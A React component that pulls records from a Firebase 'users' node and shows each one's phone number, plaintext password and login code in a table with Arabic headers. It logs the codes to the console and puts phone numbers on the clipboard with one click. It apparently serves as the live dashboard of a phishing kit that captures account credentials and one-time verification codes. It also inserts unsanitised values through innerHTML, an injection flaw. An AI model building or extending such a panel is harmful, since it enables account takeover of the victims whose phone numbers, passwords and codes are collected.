import * as React from "react";
import AppBar from "@mui/material/AppBar";
import Toolbar from "@mui/material/Toolbar";
import Typography from "@mui/material/Typography";
import Paper from "@mui/material/Paper";
import Grid from "@mui/material/Grid";
import { Table, TableBody, TableHead } from "@mui/material";
import { database } from "./firebase";

import { get, query, onChildAdded, ref } from "firebase/database";

export default function Content() {
  const [dt, setDt] = React.useState([{ phone: "", pass: "", code: "" }]);
  const dbRef = ref(database, "users");
  const qw = query(dbRef);
  const im = [];

  onChildAdded(qw, (s) => {
    const dataBody = document.getElementById("dataBody");
    console.log(s.val().code);
    const phoneele = document.getElementById(s.val().phone);
    if (phoneele) {
      phoneele.addEventListener("click", (e) => {
        navigator.clipboard.writeText(s.val().phone).then(
          function () {
            console.log("Async: Copying to clipboard was successful!");
          },
          function (err) {
            console.error("Async: Could not copy text: ", err);
          },
        );
      });
    }
    const row = document.createElement("tr");
    if (s.exists) {
      row.innerHTML = `
    <td class="responstable">${s.val().phone}</td>
        <td class="responstable ">${s.val().pass}</td>
        <td class="responstable">${s.val().code}</td>
        <!-- Add more cells as per your data structure -->
    `;
      dataBody.appendChild(row);
    }
  });
  return (
    <Paper sx={{ maxWidth: 936, margin: "auto", overflow: "hidden" }}>
      <AppBar
        position="static"
        color="default"
        elevation={0}
        sx={{ borderBottom: "1px solid rgba(0, 0, 0, 0.12)" }}
      >
        <Toolbar>
          <Grid container spacing={2} alignItems="center"></Grid>
        </Toolbar>
      </AppBar>
      <Table>
        <TableHead>
          <th className="responstable">رقم الهاتف</th>
          <th className="responstable">رمز السري</th>
          <th className="responstable">رمز الدخول</th>
        </TableHead>
        <TableBody className="responstable" id="dataBody"></TableBody>
      </Table>
    </Paper>
  );
}
